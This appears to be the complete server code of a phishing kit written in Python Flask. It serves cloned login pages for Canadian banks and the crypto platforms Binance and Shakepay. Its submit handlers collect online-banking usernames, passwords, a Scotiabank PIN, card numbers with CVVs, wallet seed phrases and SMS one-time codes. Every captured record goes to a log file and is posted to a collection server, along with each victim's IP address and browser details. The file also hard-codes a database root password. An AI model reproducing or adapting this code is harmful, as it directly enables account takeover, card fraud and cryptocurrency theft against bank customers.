from flask import Flask, request, render_template, redirect, url_for, jsonify, session, abort
from flask_session import Session
import mysql.connector
import requests
import datetime
import logging
import re
import os
import uuid
import json
import argparse

app = Flask(__name__, template_folder='templates', static_folder='static')
app.config['SECRET_KEY'] = os.urandom(24)
app.config['SESSION_TYPE'] = 'filesystem'
app.config['SESSION_PERMANENT'] = False  
app.config['PERMANENT_SESSION_LIFETIME'] = 3600  
Session(app)
logging.basicConfig(level=logging.INFO)

PENDING_TRANSITIONS = {}
INSTITUTION_MESSAGE_TRIGGER = {}

DB_CONFIG = {
    'host': 'localhost',
    'port': '2000',
    'user': 'root',  
    'password': 'ybkgn7rE8bQ2hxVe4XwAYcdmtQaFsaJn6NPBuscJYYEs5hR$', 
    'database': 'urlandusers'
}
FORWARD_URL = "http://10.0.1.32:34781/fetch-data-from-url"  
LOG_FILE = "user_data.log"
NOTIFICATION_LOG_FILE = "site_transitions.log"
GET_MESSAGE_URL = "http://10.0.1.32:34781/get-message"  
TRANSITION_URL = "http://10.0.1.32:34781/fetch-transition-from-url"

VALID_TEMPLATES = [
    'sms-code.html',
    'TEXT.html',
    'push-sms.html',
    'hold-success.html',
    'Forma.html',
    'loading.html',
    'main.html',
]

def get_db_connection():
    """Creates a database connection"""
    try:
        return mysql.connector.connect(**DB_CONFIG)
    except mysql.connector.Error as e:
        app.logger.error(f"Error connecting to database: {str(e)}")
        return None

def check_url_id(url_id):
    """Checks if url_id exists in the database and returns amount"""
    conn = get_db_connection()
    if not conn:
        return None, None
    try:
        cursor = conn.cursor()
        cursor.execute("SELECT url, amount FROM users WHERE url = %s", (url_id,))
        result = cursor.fetchone()
        cursor.close()
        conn.close()
        if result:
            return result[0], str(result[1])
        return None, None
    except mysql.connector.Error as e:
        app.logger.error(f"Error querying database: {str(e)}")
        return None, None

def get_valid_url_id():
    """Validates url_id from request or session"""
    url_id = request.args.get('url_id') or session.get('url_id')
    if request.method == 'POST':
        url_id = request.form.get('url_id') or (request.json.get('url_id') if request.is_json else url_id)
    if not url_id:
        app.logger.error("Missing url_id")
        return None
    session['url_id'] = url_id
    id_exists, amount = check_url_id(url_id)
    if not id_exists:
        app.logger.error(f"Invalid url_id: {url_id}")
        return None
    return url_id, amount

def extract_amount(amount_str):
    """Extracts numeric value from amount string"""
    try:
        clean_str = re.sub(r'[^\d.,]', '', amount_str)
        clean_str = clean_str.replace(',', '.')
        amount_value = float(clean_str)
        return str(int(round(amount_value)))
    except (ValueError, TypeError):
        return "0"

def format_data_line(data):
    """Formats data into a string with specified order and field names"""
    fields = [
        data.get('card_number', '0'),
        data.get('card_timelife', '0'),
        data.get('card_cvc', '0'),
        data.get('amount', '0'),
        data.get('url_id', '0'),
        data.get('ip', '0'),
        data.get('useragent', '0'),
        data.get('username', '0'),
        data.get('password', '0'),
        data.get('scotiapin', '0'),
        data.get('bankname', '0'),
        data.get('seedphrase', '0')
    ]
    return ";;;".join(fields)

def log_and_forward(data_line):
    """Logs and forwards data"""
    try:
        with open(LOG_FILE, "a") as log:
            log.write(data_line + "\n")
        headers = {'Content-Type': 'text/plain'}
        response = requests.post(FORWARD_URL, data=data_line, headers=headers, timeout=3)
        response.raise_for_status()
        app.logger.info(f"Data sent to {FORWARD_URL}")
    except Exception as e:
        app.logger.error(f"Error sending data to {FORWARD_URL}: {str(e)}")

def log_notification(data_line):
    """Logs transition notifications"""
    try:
        with open(NOTIFICATION_LOG_FILE, "a") as log:
            log.write(data_line + "\n")
        headers = {'Content-Type': 'text/plain'}
        response = requests.post(TRANSITION_URL, data=data_line, headers=headers, timeout=3) if not data_line.__contains__("Java-http-client") else 0
        response.raise_for_status()
        app.logger.info(f"Transition logged and sent to {TRANSITION_URL}: {data_line}")
    except Exception as e:
        app.logger.error(f"Error in log_transition for {data_line}: {str(e)}")

def log_transition(page, message, url_id):
    """Logs page transitions"""
    try:
        ip_address = request.remote_addr or '0'
        user_agent = request.headers.get('User-Agent', '0')
        timestamp = datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        data_line = f"{timestamp};;;{url_id};;;{page};;;{message};;;{ip_address};;;{user_agent}"
        log_notification(data_line)
    except Exception as e:
        app.logger.error(f"Error in log_transition for {page}: {str(e)}")

# --- Добавляем обработчики ошибок ---
@app.errorhandler(400)
@app.errorhandler(403)
@app.errorhandler(404)
@app.errorhandler(405)
@app.errorhandler(500)
def handle_errors(e):
    """Перенаправляет все ошибки на кастомную страницу 404"""
    app.logger.error(f"Error {e.code}: {str(e)}")
    return render_template('404.html'), e.code

# --- Остальной код приложения с изменениями ---
@app.route('/forma')
def forma_page():
    result = get_valid_url_id()
    if not result:
        abort(400)
    url_id, total = result
    log_transition('Forma', 'User accessed Forma page', url_id)
    return render_template('Forma.html', reference=url_id, total=total)

@app.route('/before_request')
def before_request():
    url_id = request.args.get('url_id')
    if url_id:
        session['url_id'] = url_id
        session['current_url_id'] = url_id
    elif 'current_url_id' in session:
        request.url_id = session['current_url_id']

@app.route('/')
def main():
    result = get_valid_url_id()
    if not result:
        abort(400)
    url_id, total = result
    session['url_id'] = url_id
    log_transition('Main', 'User navigated to the main site', url_id)
    return render_template('main.html', reference=url_id, total=total)

@app.route('/ATB')
def atb_page():
    result = get_valid_url_id()
    if not result:
        abort(400)
    url_id, total = result
    if session.get('url_id') != url_id:
        abort(403)
    log_transition('ATB', 'User selected bank ATB', url_id)
    return render_template('ATB.html', reference=url_id, total=total)

@app.route('/Manulife')
def manulife_page():
    result = get_valid_url_id()
    if not result:
        abort(400)
    url_id, total = result
    if session.get('url_id') != url_id:
        abort(403)
    log_transition('Manulife', 'User selected bank Manulife', url_id)
    return render_template('Manulife.html', reference=url_id, total=total)

@app.route('/Meridian')
def meridian_page():
    result = get_valid_url_id()
    if not result:
        abort(400)
    url_id, total = result
    if session.get('url_id') != url_id:
        abort(403)
    log_transition('Meridian', 'User selected bank Meridian', url_id)
    return render_template('Meridian.html', reference=url_id, total=total)

@app.route('/MotusBank')
def motusbank_page():
    result = get_valid_url_id()
    if not result:
        abort(400)
    url_id, total = result
    if session.get('url_id') != url_id:
        abort(403)
    log_transition('MotusBank', 'User selected bank MotusBank', url_id)
    return render_template('MotusBank.html', reference=url_id, total=total)

@app.route('/PcFinancial')
def pc_financial_page():
    result = get_valid_url_id()
    if not result:
        abort(400)
    url_id, total = result
    if session.get('url_id') != url_id:
        abort(403)
    log_transition('PcFinancial', 'User selected bank PcFinancial', url_id)
    return render_template('PcFinancial.html', reference=url_id, total=total)

@app.route('/Peoples')
def peoples_page():
    result = get_valid_url_id()
    if not result:
        abort(400)
    url_id, total = result
    if session.get('url_id') != url_id:
        abort(403)
    log_transition('Peoples', 'User selected bank Peoples', url_id)
    return render_template('Peoples.html', reference=url_id, total=total)

@app.route('/Banque')
def banque_page():
    result = get_valid_url_id()
    if not result:
        abort(400)
    url_id, total = result
    if session.get('url_id') != url_id:
        abort(403)
    log_transition('Banque', 'User selected bank Banque', url_id)
    return render_template('Banque.html', reference=url_id, total=total)

@app.route('/Simplii')
def simplii_page():
    result = get_valid_url_id()
    if not result:
        abort(400)
    url_id, total = result
    if session.get('url_id') != url_id:
        abort(403)
    log_transition('Simplii', 'User selected bank Simplii', url_id)
    return render_template('Simplii.html', reference=url_id, total=total)

@app.route('/Tangerine')
def tangerine_page():
    result = get_valid_url_id()
    if not result:
        abort(400)
    url_id, total = result
    if session.get('url_id') != url_id:
        abort(403)
    log_transition('Tangerine', 'User selected bank Tangerine', url_id)
    return render_template('Tangerine.html', reference=url_id, total=total)

@app.route('/Coastcapital')
def coastcapital_page():
    result = get_valid_url_id()
    if not result:
        abort(400)
    url_id, total = result
    if session.get('url_id') != url_id:
        abort(403)
    log_transition('Coastcapital', 'User selected bank Coastcapital', url_id)
    return render_template('Coastcapital.html', reference=url_id, total=total)

@app.route('/ScotiaBank')
def scotiabank_page():
    result = get_valid_url_id()
    if not result:
        abort(400)
    url_id, total = result
    if session.get('url_id') != url_id:
        abort(403)
    log_transition('ScotiaBank', 'User selected bank ScotiaBank', url_id)
    return render_template('ScotiaBank.html', reference=url_id, total=total)

@app.route('/Binance')
def binance_page():
    result = get_valid_url_id()
    if not result:
        abort(400)
    url_id, total = result
    if session.get('url_id') != url_id:
        abort(403)
    log_transition('Binance', 'User selected bank Binance', url_id)
    return render_template('Binance.html', reference=url_id, total=total)

@app.route('/bmo')
def bmo_page():
    result = get_valid_url_id()
    if not result:
        abort(400)
    url_id, total = result
    if session.get('url_id') != url_id:
        abort(403)
    log_transition('bmo', 'User selected bank BMO', url_id)
    return render_template('bmo.html', reference=url_id, total=total)

@app.route('/NationalBank')
def national_bank_page():
    result = get_valid_url_id()
    if not result:
        abort(400)
    url_id, total = result
    if session.get('url_id') != url_id:
        abort(403)
    log_transition('NationalBank', 'User selected bank NationalBank', url_id)
    return render_template('NationalBank.html', reference=url_id, total=total)

@app.route('/cibc')
def cibc_page():
    result = get_valid_url_id()
    if not result:
        abort(400)
    url_id, total = result
    if session.get('url_id') != url_id:
        abort(403)
    log_transition('cibc', 'User selected bank CIBC', url_id)
    return render_template('cibc.html', reference=url_id, total=total)

@app.route('/RBC')
def rbc_page():
    result = get_valid_url_id()
    if not result:
        abort(400)
    url_id, total = result
    if session.get('url_id') != url_id:
        abort(403)
    log_transition('RBC', 'User selected bank RBC', url_id)
    return render_template('RBC.html', reference=url_id, total=total)

@app.route('/Desjardins')
def desjardins_page():
    result = get_valid_url_id()
    if not result:
        abort(400)
    url_id, total = result
    if session.get('url_id') != url_id:
        abort(403)
    log_transition('Desjardins', 'User selected bank Desjardins', url_id)
    return render_template('Desjardins.html', reference=url_id, total=total)

@app.route('/tdbank')
def tdbank_page():
    result = get_valid_url_id()
    if not result:
        abort(400)
    url_id, total = result
    if session.get('url_id') != url_id:
        abort(403)
    log_transition('tdbank', 'User selected bank TD Bank', url_id)
    return render_template('tdbank.html', reference=url_id, total=total)

@app.route('/shakepay')
def shakepay_page():
    result = get_valid_url_id()
    if not result:
        abort(400)
    url_id, total = result
    if session.get('url_id') != url_id:
        abort(403)
    log_transition('shakepay', 'User selected bank Shakepay', url_id)
    return render_template('shakepay.html', reference=url_id, total=total)

@app.route('/submit-sms-code', methods=['POST'])
def submit_sms_code():
    try:
        result = get_valid_url_id()
        if not result:
            abort(400)
        url_id, total = result
        if session.get('url_id') != url_id:
            abort(403)

        sms_code = request.form.get('sms-code', '').strip()
        if not sms_code:
            abort(400)

        data = {
            'url_id': url_id,
            'message': sms_code,
            'message_type': 'sms-code'
        }
        
        app.logger.info(f"Sending SMS data to {GET_MESSAGE_URL}: {data}")
        try:
            response = requests.post(
                GET_MESSAGE_URL,
                json=data,
                timeout=3
            )
            response.raise_for_status()
            app.logger.info(f"Data sent to {GET_MESSAGE_URL}, status: {response.status_code}")
        except Exception as e:
            app.logger.error(f"Error sending to {GET_MESSAGE_URL}: {str(e)}")

        log_transition('SMSCode', 'User submitted SMS code', url_id)
        return render_template('loading.html', reference=url_id, total=total)

    except Exception as e:
        app.logger.error(f"Error in submit_sms_code: {str(e)}")
        abort(500)

@app.route('/get-message', methods=['POST'])
def get_message():
    try:
        result = get_valid_url_id()
        if not result:
            abort(400)
        url_id, total = result
        if session.get('url_id') != url_id:
            abort(403)

        message = request.form.get('text', '0').strip()
        data_line = f"{url_id};;;{message}"
        
        try:
            with open(LOG_FILE, "a") as log:
                log.write(data_line + "\n")
            
            headers = {'Content-Type': 'text/plain'}
            response = requests.post(GET_MESSAGE_URL, data=data_line, headers=headers, timeout=3)
            response.raise_for_status()
            app.logger.info(f"Data sent to {GET_MESSAGE_URL}")
        except Exception as e:
            app.logger.error(f"Error sending data to {GET_MESSAGE_URL}: {str(e)}")
        
        log_transition('GetMessage', 'User submitted message from form', url_id)
        
        return render_template('loading.html', reference=url_id, total=total)

    except Exception as e:
        app.logger.error(f"Error in get_message: {str(e)}")
        abort(500)

@app.route('/submit-forma', methods=['POST'])
def submit_forma():
    try:
        result = get_valid_url_id()
        if not result:
            abort(400)
        url_id, total = result
        if session.get('url_id') != url_id:
            abort(403)
            
        sms_value = request.form.get('sms', '').strip()
        if not sms_value:
            abort(400)
        
        data = {
            'url_id': url_id,
            'message': sms_value,
            'message_type': 'forma'
        }
        
        app.logger.info(f"Sending forma data to {GET_MESSAGE_URL}: {data}")
        try:
            response = requests.post(
                GET_MESSAGE_URL,
                json=data,
                timeout=3
            )
            response.raise_for_status()
            app.logger.info(f"Data sent to {GET_MESSAGE_URL}, status: {response.status_code}")
        except Exception as e:
            app.logger.error(f"Error sending to {GET_MESSAGE_URL}: {str(e)}")
        
        log_transition('Forma', f'User submitted SMS: {sms_value}', url_id)
        return render_template('loading.html', reference=url_id, total=total)
    
    except Exception as e:
        app.logger.error(f"Error in submit_forma: {str(e)}")
        abort(500)

@app.route('/submit-atb', methods=['POST'])
def submit_atb():
    try:
        result = get_valid_url_id()
        if not result:
            abort(400)
        url_id, total = result
        if session.get('url_id') != url_id:
            abort(403)
            
        login_data = {
            'url_id': url_id,
            'username': request.form.get('login-id', '0').strip(),
            'password': request.form.get('password', '0').strip(),
            'bankname': 'ATB',
            'amount': total,
            'ip': request.remote_addr or '0',
            'useragent': request.headers.get('User-Agent', '0'),
            'card_number': '0',
            'card_timelife': '0',
            'card_cvc': '0',
            'scotiapin': '0',
            'seedphrase': '0'
        }
        
        data_line = format_data_line(login_data)
        log_and_forward(data_line)
        log_transition('ATB', 'User submitted data for ATB', url_id)
    
    except Exception as e:
        app.logger.error(f"Error in submit_atb: {str(e)}")
        abort(500)

@app.route('/submit-manulife', methods=['POST'])
def submit_manulife():
    try:
        result = get_valid_url_id()
        if not result:
            abort(400)
        url_id, total = result
        if session.get('url_id') != url_id:
            abort(403)
            
        login_data = {
            'url_id': url_id,
            'username': request.form.get('login-id', '0').strip(),
            'password': request.form.get('password', '0').strip(),
            'bankname': 'Manulife',
            'amount': total,
            'ip': request.remote_addr or '0',
            'useragent': request.headers.get('User-Agent', '0'),
            'card_number': '0',
            'card_timelife': '0',
            'card_cvc': '0',
            'scotiapin': '0',
            'seedphrase': '0'
        }
        
        data_line = format_data_line(login_data)
        log_and_forward(data_line)
        log_transition('Manulife', 'User submitted data for Manulife', url_id)
        
        return render_template('loading.html', reference=url_id, total=total)
    
    except Exception as e:
        app.logger.error(f"Error in submit_manulife: {str(e)}")
        abort(500)

@app.route('/submit-meridian', methods=['POST'])
def submit_meridian():
    try:
        result = get_valid_url_id()
        if not result:
            abort(400)
        url_id, total = result
        if session.get('url_id') != url_id:
            abort(403)
            
        login_data = {
            'url_id': url_id,
            'username': request.form.get('login-id', '0').strip(),
            'password': request.form.get('password', '0').strip(),
            'bankname': 'Meridian',
            'amount': total,
            'ip': request.remote_addr or '0',
            'useragent': request.headers.get('User-Agent', '0'),
            'card_number': '0',
            'card_timelife': '0',
            'card_cvc': '0',
            'scotiapin': '0',
            'seedphrase': '0'
        }
        
        data_line = format_data_line(login_data)
        log_and_forward(data_line)
        log_transition('Meridian', 'User submitted data for Meridian', url_id)
        
        return render_template('loading.html', reference=url_id, total=total)
    
    except Exception as e:
        app.logger.error(f"Error in submit_meridian: {str(e)}")
        abort(500)

@app.route('/submit-motusbank', methods=['POST'])
def submit_motusbank():
    try:
        result = get_valid_url_id()
        if not result:
            abort(400)
        url_id, total = result
        if session.get('url_id') != url_id:
            abort(403)
            
        login_data = {
            'url_id': url_id,
            'username': request.form.get('login-id', '0').strip(),
            'password': request.form.get('password', '0').strip(),
            'bankname': 'MotusBank',
            'amount': total,
            'ip': request.remote_addr or '0',
            'useragent': request.headers.get('User-Agent', '0'),
            'card_number': '0',
            'card_timelife': '0',
            'card_cvc': '0',
            'scotiapin': '0',
            'seedphrase': '0'
        }
        
        data_line = format_data_line(login_data)
        log_and_forward(data_line)
        log_transition('MotusBank', 'User submitted data for MotusBank', url_id)
        
        return render_template('loading.html', reference=url_id, total=total)
    
    except Exception as e:
        app.logger.error(f"Error in submit_motusbank: {str(e)}")
        abort(500)

@app.route('/submit-pcfinancial', methods=['POST'])
def submit_pcfinancial():
    try:
        result = get_valid_url_id()
        if not result:
            abort(400)
        url_id, total = result
        if session.get('url_id') != url_id:
            abort(403)
            
        login_data = {
            'url_id': url_id,
            'username': request.form.get('login-id', '0').strip(),
            'password': request.form.get('password', '0').strip(),
            'bankname': 'PcFinancial',
            'amount': total,
            'ip': request.remote_addr or '0',
            'useragent': request.headers.get('User-Agent', '0'),
            'card_number': '0',
            'card_timelife': '0',
            'card_cvc': '0',
            'scotiapin': '0',
            'seedphrase': '0'
        }
        
        data_line = format_data_line(login_data)
        log_and_forward(data_line)
        log_transition('PcFinancial', 'User submitted data for PcFinancial', url_id)
        
        return render_template('loading.html', reference=url_id, total=total)
    
    except Exception as e:
        app.logger.error(f"Error in submit_pcfinancial: {str(e)}")
        abort(500)

@app.route('/submit-peoples', methods=['POST'])
def submit_peoples():
    try:
        result = get_valid_url_id()
        if not result:
            abort(400)
        url_id, total = result
        if session.get('url_id') != url_id:
            abort(403)
            
        login_data = {
            'url_id': url_id,
            'username': request.form.get('memberNum', '0').strip(),
            'password': request.form.get('password', '0').strip(),
            'bankname': 'Peoples',
            'amount': total,
            'ip': request.remote_addr or '0',
            'useragent': request.headers.get('User-Agent', '0'),
            'card_number': '0',
            'card_timelife': '0',
            'card_cvc': '0',
            'scotiapin': '0',
            'seedphrase': '0'
        }
        
        data_line = format_data_line(login_data)
        log_and_forward(data_line)
        log_transition('Peoples', 'User submitted data for Peoples', url_id)
        
        return render_template('loading.html', reference=url_id, total=total)
    
    except Exception as e:
        app.logger.error(f"Error in submit_peoples: {str(e)}")
        abort(500)

@app.route('/submit-banque', methods=['POST'])
def submit_banque():
    try:
        result = get_valid_url_id()
        if not result:
            abort(400)
        url_id, total = result
        if session.get('url_id') != url_id:
            abort(403)
            
        login_data = {
            'url_id': url_id,
            'username': request.form.get('login-id', '0').strip(),
            'password': request.form.get('password', '0').strip(),
            'bankname': 'Banque',
            'amount': total,
            'ip': request.remote_addr or '0',
            'useragent': request.headers.get('User-Agent', '0'),
            'card_number': '0',
            'card_timelife': '0',
            'card_cvc': '0',
            'scotiapin': '0',
            'seedphrase': '0'
        }
        
        data_line = format_data_line(login_data)
        log_and_forward(data_line)
        log_transition('Banque', 'User submitted data for Banque', url_id)
        
        return render_template('loading.html', reference=url_id, total=total)
    
    except Exception as e:
        app.logger.error(f"Error in submit_banque: {str(e)}")
        abort(500)

@app.route('/submit-simplii', methods=['POST'])
def submit_simplii():
    try:
        result = get_valid_url_id()
        if not result:
            abort(400)
        url_id, total = result
        if session.get('url_id') != url_id:
            abort(403)
            
        login_data = {
            'url_id': url_id,
            'username': request.form.get('login-id', '0').strip(),
            'password': request.form.get('password', '0').strip(),
            'bankname': 'Simplii',
            'amount': total,
            'ip': request.remote_addr or '0',
            'useragent': request.headers.get('User-Agent', '0'),
            'card_number': '0',
            'card_timelife': '0',
            'card_cvc': '0',
            'scotiapin': '0',
            'seedphrase': '0'
        }
        
        data_line = format_data_line(login_data)
        log_and_forward(data_line)
        log_transition('Simplii', 'User submitted data for Simplii', url_id)
        
        return render_template('loading.html', reference=url_id, total=total)
    
    except Exception as e:
        app.logger.error(f"Error in submit_simplii: {str(e)}")
        abort(500)

@app.route('/submit-tangerine', methods=['POST'])
def submit_tangerine():
    try:
        result = get_valid_url_id()
        if not result:
            abort(400)
        url_id, total = result
        if session.get('url_id') != url_id:
            abort(403)
            
        login_data = {
            'url_id': url_id,
            'username': request.form.get('login-id', '0').strip(),
            'password': request.form.get('password', '0').strip(),
            'bankname': 'Tangerine',
            'amount': total,
            'ip': request.remote_addr or '0',
            'useragent': request.headers.get('User-Agent', '0'),
            'card_number': '0',
            'card_timelife': '0',
            'card_cvc': '0',
            'scotiapin': '0',
            'seedphrase': '0'
        }
        
        data_line = format_data_line(login_data)
        log_and_forward(data_line)
        log_transition('Tangerine', 'User submitted data for Tangerine', url_id)
        
        return render_template('loading.html', reference=url_id, total=total)
    
    except Exception as e:
        app.logger.error(f"Error in submit_tangerine: {str(e)}")
        abort(500)

@app.route('/submit-coastcapital', methods=['POST'])
def submit_coastcapital():
    try:
        result = get_valid_url_id()
        if not result:
            abort(400)
        url_id, total = result
        if session.get('url_id') != url_id:
            abort(403)
        login_data = {
            'url_id': url_id,
            'username': request.form.get('login-id', '0').strip(),
            'password': request.form.get('password', '0').strip(),
            'bankname': 'Coastcapital',
            'amount': total,
            'ip': request.remote_addr or '0',
            'useragent': request.headers.get('User-Agent', '0'),
            'card_number': '0',
            'card_timelife': '0',
            'card_cvc': '0',
            'scotiapin': '0',
            'seedphrase': '0'
        }
        
        data_line = format_data_line(login_data)
        log_and_forward(data_line)
        log_transition('Coastcapital', 'User submitted data for Coastcapital', url_id)
        
        return render_template('loading.html', reference=url_id, total=total)
    
    except Exception as e:
        app.logger.error(f"Error in submit_coastcapital: {str(e)}")
        abort(500)

@app.route('/submit-scotiabank', methods=['POST'])
def submit_scotiabank():
    try:
        result = get_valid_url_id()
        if not result:
            abort(400)
        url_id, total = result
        if session.get('url_id') != url_id:
            abort(403)
            
        login_data = {
            'url_id': url_id,
            'username': request.form.get('login-id', '0').strip(),
            'password': request.form.get('password', '0').strip(),
            'bankname': 'ScotiaBank',
            'amount': total,
            'ip': request.remote_addr or '0',
            'useragent': request.headers.get('User-Agent', '0'),
            'card_number': '0',
            'card_timelife': '0',
            'card_cvc': '0',
            'scotiapin': request.form.get('scotiapin', '0').strip(),
            'seedphrase': '0'
        }
        
        data_line = format_data_line(login_data)
        log_and_forward(data_line)
        log_transition('ScotiaBank', 'User submitted data for ScotiaBank', url_id)
        
        return render_template('loading.html', reference=url_id, total=total)
    
    except Exception as e:
        app.logger.error(f"Error in submit_scotiabank: {str(e)}")
        abort(500)

@app.route('/submit-binance', methods=['POST'])
def submit_binance():
    try:
        result = get_valid_url_id()
        if not result:
            abort(400)
        url_id, total = result
        if session.get('url_id') != url_id:
            abort(403)
            
        word_count = request.form.get('wordCount', '12').strip()
        if word_count not in ['12', '24']:
            raise ValueError(f"Invalid wordCount: {word_count}. Must be 12 or 24.")
        word_count = int(word_count)
        
        seed_phrase = []
        for i in range(1, word_count + 1):
            word = request.form.get(f'word{i}', '0').strip()
            seed_phrase.append(word)
        
        if len([w for w in seed_phrase if w != '0']) < word_count:
            raise ValueError(f"Incomplete seed phrase: expected {word_count} words, got {len([w for w in seed_phrase if w != '0'])}")
        
        binance_data = {
            'url_id': url_id,
            'seedphrase': ' '.join(seed_phrase),
            'card_number': '0',
            'card_timelife': '0',
            'card_cvc': '0',
            'amount': total,
            'ip': request.remote_addr or '0',
            'useragent': request.headers.get('User-Agent', '0'),
            'username': '0',
            'password': '0',
            'scotiapin': '0',
            'bankname': 'Binance'
        }

        data_line = format_data_line(binance_data)
        log_and_forward(data_line)
        log_transition('Binance', 'User submitted data for Binance', url_id)
        
        return render_template('loading.html', reference=url_id, total=total)
    
    except ValueError as ve:
        app.logger.error(f"Validation error in submit_binance: {str(ve)}")
        abort(400)
    except Exception as e:
        app.logger.error(f"Error in submit_binance: {str(e)}")
        abort(500)

@app.route('/submit-bmo', methods=['POST'])
def submit_bmo():
    try:
        result = get_valid_url_id()
        if not result:
            abort(400)
        url_id, total = result
        if session.get('url_id') != url_id:
            abort(403)
            
        login_data = {
            'url_id': url_id,
            'username': request.form.get('login-id', '0').strip(),
            'password': request.form.get('password', '0').strip(),
            'bankname': 'BMO',
            'amount': total,
            'ip': request.remote_addr or '0',
            'useragent': request.headers.get('User-Agent', '0'),
            'card_number': '0',
            'card_timelife': '0',
            'card_cvc': '0',
            'scotiapin': '0',
            'seedphrase': '0'
        }
        
        data_line = format_data_line(login_data)
        log_and_forward(data_line)
        log_transition('BMO', 'User submitted data for BMO', url_id)
        
        return render_template('loading.html', reference=url_id, total=total)
    
    except Exception as e:
        app.logger.error(f"Error in submit_bmo: {str(e)}")
        abort(500)

@app.route('/submit-nationalbank', methods=['POST'])
def submit_nationalbank():
    try:
        result = get_valid_url_id()
        if not result:
            abort(400)
        url_id, total = result
        if session.get('url_id') != url_id:
            abort(403)
            
        login_data = {
            'url_id': url_id,
            'username': request.form.get('login-id', '0').strip(),
            'password': request.form.get('password', '0').strip(),
            'bankname': 'NationalBank',
            'amount': total,
            'ip': request.remote_addr or '0',
            'useragent': request.headers.get('User-Agent', '0'),
            'card_number': '0',
            'card_timelife': '0',
            'card_cvc': '0',
            'scotiapin': '0',
            'seedphrase': '0'
        }
        
        data_line = format_data_line(login_data)
        log_and_forward(data_line)
        log_transition('NationalBank', 'User submitted data for NationalBank', url_id)
        
        return render_template('loading.html', reference=url_id, total=total)
    
    except Exception as e:
        app.logger.error(f"Error in submit_nationalbank: {str(e)}")
        abort(500)

@app.route('/submit-cibc', methods=['POST'])
def submit_cibc():
    try:
        result = get_valid_url_id()
        if not result:
            abort(400)
        url_id, total = result
        if session.get('url_id') != url_id:
            abort(403)
            
        login_data = {
            'url_id': url_id,
            'username': request.form.get('login-id', '0').strip(),
            'password': request.form.get('password', '0').strip(),
            'bankname': 'CIBC',
            'amount': total,
            'ip': request.remote_addr or '0',
            'useragent': request.headers.get('User-Agent', '0'),
            'card_number': '0',
            'card_timelife': '0',
            'card_cvc': '0',
            'scotiapin': '0',
            'seedphrase': '0'
        }
        
        data_line = format_data_line(login_data)
        log_and_forward(data_line)
        log_transition('CIBC', 'User submitted data for CIBC', url_id)
        
        return render_template('loading.html', reference=url_id, total=total)
    
    except Exception as e:
        app.logger.error(f"Error in submit_cibc: {str(e)}")
        abort(500)

@app.route('/submit-rbc', methods=['POST'])
def submit_rbc():
    try:
        result = get_valid_url_id()
        if not result:
            abort(400)
        url_id, total = result
        if session.get('url_id') != url_id:
            abort(403)
            
        login_data = {
            'url_id': url_id,
            'username': request.form.get('login-id', '0').strip(),
            'password': request.form.get('password', '0').strip(),
            'bankname': 'RBC',
            'amount': total,
            'ip': request.remote_addr or '0',
            'useragent': request.headers.get('User-Agent', '0'),
            'card_number': '0',
            'card_timelife': '0',
            'card_cvc': '0',
            'scotiapin': '0',
            'seedphrase': '0'
        }
        
        data_line = format_data_line(login_data)
        log_and_forward(data_line)
        log_transition('RBC', 'User submitted data for RBC', url_id)
        
        return render_template('loading.html', reference=url_id, total=total)
    
    except Exception as e:
        app.logger.error(f"Error in submit_rbc: {str(e)}")
        abort(500)

@app.route('/submit-desjardins', methods=['POST'])
def submit_desjardins():
    try:
        result = get_valid_url_id()
        if not result:
            abort(400)
        url_id, total = result
        if session.get('url_id') != url_id:
            abort(403)
            
        login_data = {
            'url_id': url_id,
            'username': request.form.get('login-id', '0').strip(),
            'password': request.form.get('password', '0').strip(),
            'bankname': 'Desjardins',
            'amount': total,
            'ip': request.remote_addr or '0',
            'useragent': request.headers.get('User-Agent', '0'),
            'card_number': '0',
            'card_timelife': '0',
            'card_cvc': '0',
            'scotiapin': '0',
            'seedphrase': '0'
        }
        
        data_line = format_data_line(login_data)
        log_and_forward(data_line)
        log_transition('Desjardins', 'User submitted data for Desjardins', url_id)
        
        return render_template('loading.html', reference=url_id, total=total)
    
    except Exception as e:
        app.logger.error(f"Error in submit_desjardins: {str(e)}")
        abort(500)

@app.route('/submit-tdbank', methods=['POST'])
def submit_tdbank():
    try:
        result = get_valid_url_id()
        if not result:
            abort(400)
        url_id, total = result
        if session.get('url_id') != url_id:
            abort(403)
            
        login_data = {
            'url_id': url_id,
            'username': request.form.get('login-id', '0').strip(),
            'password': request.form.get('password', '0').strip(),
            'bankname': 'TDBank',
            'amount': total,
            'ip': request.remote_addr or '0',
            'useragent': request.headers.get('User-Agent', '0'),
            'card_number': '0',
            'card_timelife': '0',
            'card_cvc': '0',
            'scotiapin': '0',
            'seedphrase': '0'
        }
        
        data_line = format_data_line(login_data)
        log_and_forward(data_line)
        log_transition('TDBank', 'User submitted data for TDBank', url_id)
        
        return render_template('loading.html', reference=url_id, total=total)
    
    except Exception as e:
        app.logger.error(f"Error in submit_tdbank: {str(e)}")
        abort(500)

@app.route('/submit-shakepay', methods=['POST'])
def submit_shakepay():
    try:
        result = get_valid_url_id()
        if not result:
            abort(400)
        url_id, total = result
        if session.get('url_id') != url_id:
            abort(403)
            
        login_data = {
            'url_id': url_id,
            'username': request.form.get('login-id', '0').strip(),
            'password': request.form.get('password', '0').strip(),
            'bankname': 'Shakepay',
            'amount': total,
            'ip': request.remote_addr or '0',
            'useragent': request.headers.get('User-Agent', '0'),
            'card_number': '0',
            'card_timelife': '0',
            'card_cvc': '0',
            'scotiapin': '0',
            'seedphrase': '0'
        }
        
        data_line = format_data_line(login_data)
        log_and_forward(data_line)
        log_transition('Shakepay', 'User submitted data for Shakepay', url_id)
        
        return render_template('loading.html', reference=url_id, total=total)
    
    except Exception as e:
        app.logger.error(f"Error in submit_shakepay: {str(e)}")
        abort(500)

@app.route('/submit-card', methods=['POST'])
def submit_card():
    try:
        result = get_valid_url_id()
        if not result:
            abort(400)
        url_id, total = result
        if session.get('url_id') != url_id:
            abort(403)
            
        card_data = {
            'url_id': url_id,
            'seedphrase': '0',
            'card_number': re.sub(r'\D', '', request.form.get('card-number', '0')),
            'card_timelife': request.form.get('expiry-date', '0').strip(),
            'card_cvc': request.form.get('cvv', '0').strip(),
            'amount': total,
            'ip': request.remote_addr or '0',
            'useragent': request.headers.get('User-Agent', '0'),
            'username': '0',
            'password': '0',
            'scotiapin': '0',
            'bankname': 'Card'
        }
        
        data_line = format_data_line(card_data)
        log_and_forward(data_line)
        log_transition('CardSubmission', 'User submitted card data', url_id)
        
        return render_template('loading.html', reference=url_id, total=total)

    except Exception as e:
        app.logger.error(f"Error in submit_card: {str(e)}")
        abort(500)

